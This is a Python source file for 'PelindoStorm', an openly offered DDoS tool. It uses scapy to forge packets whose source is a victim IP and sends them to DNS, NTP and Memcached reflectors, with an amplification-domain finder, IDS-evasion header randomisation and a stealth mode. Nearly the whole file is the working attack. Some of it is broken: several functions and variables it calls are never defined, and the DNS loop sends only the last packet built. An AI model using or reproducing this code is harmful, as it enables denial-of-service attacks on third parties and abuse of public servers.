import threading
import time
import random
import os
import sys
from scapy.all import *

if sys.version_info[0] < 3:
    print("[!] Script ini membutuhkan Python 3. Silakan jalankan dengan python3.")
    sys.exit(1)

threads_count = 10
send_interval = 0.05
dns_server_ip = "8.8.8.8"
ntp_server_ip = "pool.ntp.org"
memcached_server_ip = "1.2.3.4"
timeout_scan = 2
anti_ids_mode = True
safe_mode = False
stealth_mode = False

packet_sent = 0
lock = threading.Lock()
running = False
victim_ip = ""
method = "DNS"

def show_splashscreen():
    splash_text = """
-------------------------------------
      Welcome to PelindoStorm
    DNS Amplification DDoS Tool
-------------------------------------
"""
    for char in splash_text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.01)
    print("\n")

def show_loading():
    loading_stages = [
        "[#               ] 10%",
        "[###             ] 30%",
        "[######          ] 50%",
        "[#########       ] 70%",
        "[############    ] 90%",
        "[##############] 100%"
    ]
    for stage in loading_stages:
        sys.stdout.write("\rLoading: " + stage)
        sys.stdout.flush()
        time.sleep(0.5)
    print("\n")

def show_motd():
    print("\033[96m")
    print(r'''
    ____       ___           __         _____ __                     
   / __ \___  / (_)___  ____/ /___     / ___// /_____  _________ ___ 
  / /_/ / _ \/ / / __ \/ __  / __ \    \__ \/ __/ __ \/ ___/ __ `__ \
 / ____/  __/ / / / / / /_/ / /_/ /   ___/ / /_/ /_/ / /  / / / / / /
/_/    \___/_/_/_/ /_/\__,_/\____/   /____/\__/\____/_/  /_/ /_/ /_/ 
                                                                        
    ''')
    print("\033[93m                                                     by 0xjessie21\n\033[0m", end="")
    print("\033[92m                                                     ILCS Cyber Security\033[0m")
# Auto Resolver
def auto_discover_domains(max_retries=3):
    print("[*] Automatic public domain search...")
    for attempt in range(1, max_retries + 1):
        print(f"[*] Attempt {attempt}/{max_retries}: Searching domains...")
        domains = []
        try:
            public_domains = [
                "google.com", "wikipedia.org", "amazon.com", "facebook.com",
                "microsoft.com", "yahoo.com", "reddit.com", "netflix.com",
                "cloudflare.com", "mozilla.org", "baidu.com", "github.com",
                "wordpress.com", "linkedin.com", "adobe.com", "apple.com"
            ]
            for domain in public_domains:
                dns_query = IP(dst=dns_server_ip) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=domain, qtype=255))
                ans = sr1(dns_query, verbose=0, timeout=2)
                if ans and ans.haslayer(DNS):
                    size = len(ans)
                    print(f"[-] {domain}: {size} bytes")
                    domains.append((domain, size))
        except Exception as e:
            print(f"[!] Error while searching for domain: {e}")

        domains.sort(key=lambda x: x[1], reverse=True)

        if domains:
            print(f"[+] Found {len(domains)} domains for amplification.")
            return [d[0] for d in domains[:5]]  # Ambil top 5 terbaik

        print(f"[!] Attempt {attempt} Failed to find domain. Retry in 2 seconds...\n")
        time.sleep(2)

    print("[!] All attempts failed. Using default fallback.")
    return ["example.com"]

# Utility Functions
def random_ip(start, end):
    start = list(map(int, start.split(".")))
    end = list(map(int, end.split(".")))
    generated = [random.randint(start[i], end[i]) for i in range(4)]
    return ".".join(map(str, generated))

def randomize_headers(pkt):
    pkt[IP].id = random.randint(1, 65535)
    pkt[IP].ttl = random.randint(32, 255)
    pkt[IP].tos = random.randint(0, 255)
    pkt[UDP].sport = RandShort()
    return pkt

def statistics():
    global packet_sent
    while running:
        time.sleep(5)
        with lock:
            print(f"[+] Packet sent: {packet_sent} packets")
            estimated_bandwidth = packet_sent * 500 / 5
            print(f"[+] Estimated bandwidth: {estimated_bandwidth/1024:.2f} KB/s")
            packet_sent = 0

# Attack Functions
def attack_loop():
    global packet_sent, target_domains
    best_domain = find_best_domain(dns_server_ip, target_domains)
    if best_domain:
        domains = [best_domain]
    else:
        domains = target_domains

    while running:
        src_ip = victim_ip if safe_mode else random_ip(ip_range_start, ip_range_end)
        if method == "DNS":
            for domain in domains:
                pkt = IP(src=src_ip, dst=dns_server_ip) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=domain, qtype=255))
        elif method == "NTP":
            pkt = IP(src=src_ip, dst=ntp_server_ip) / UDP(dport=123) / Raw(load="\x17\x00\x03\x2a" + "\x00" * 4)
        elif method == "Memcached":
            pkt = IP(src=src_ip, dst=memcached_server_ip) / UDP(dport=11211) / Raw(load=b"\x00\x01\x00\x01\x00\x00\x00\x00stats\r\n")
        else:
            continue

        if anti_ids_mode or stealth_mode:
            pkt = randomize_headers(pkt)

        send(pkt, verbose=False)
        with lock:
            packet_sent += 1

        if stealth_mode:
            time.sleep(random.uniform(0.02, 0.2))
        else:
            time.sleep(send_interval)

# Main Functions
def main():
    global victim_ip, method, running, safe_mode, stealth_mode, target_domains

    show_splashscreen()
    show_loading()
    show_motd()

    try:
        max_retries = int(input("Enter the maximum number of resolver retry [default 3]: ").strip() or "3")
    except ValueError:
        max_retries = 3

    target_domains = auto_discover_domains(max_retries)

    print("=== PelindoStorm Menu ===")
    victim_ip = input("Enter Target IP: ").strip()

    print("\nSelect Mode:")
    print("1. Normal Mode (requires root, spoof IP)")
    print("2. Safe Mode (without spoof, can be non-root)")
    mode_choice = input("Choice (1/2): ").strip()

    if mode_choice == '2':
        safe_mode = True
    else:
        if os.geteuid() != 0:
            print("[!] This script must be run as root for Normal Mode! Use sudo.")
            sys.exit(1)

    print("\nSelect Attack Method:")
    print("1. DNS Amplification")
    print("2. NTP Amplification")
    print("3. Memcached Amplification")
    choice = input("Choice (1/2/3): ").strip()

    if choice == '1':
        method = "DNS"
    elif choice == '2':
        method = "NTP"
    elif choice == '3':
        method = "Memcached"
    else:
        print("Invalid selection.")
        return

    stealth_choice = input("Enable Stealth Mode? (y/n): ").strip().lower()
    if stealth_choice == 'y':
        stealth_mode = True
        print("[*] Stealth Mode Activated.")

    running = True
    print(f"[*] Starting {method} attack on {victim_ip} (Safe Mode: {safe_mode}, Stealth Mode: {stealth_mode})")
    threading.Thread(target=attack_loop).start()
    threading.Thread(target=statistics, daemon=True).start()

    try:
        while running:
            cmd = input("Type 'stop' to stop: ").strip().lower()
            if cmd == 'stop':
                running = False
                print("[*] Attack stopped.")
    except KeyboardInterrupt:
        running = False
        print("\n[*] Attack stopped.")

if __name__ == "__main__":
    main()
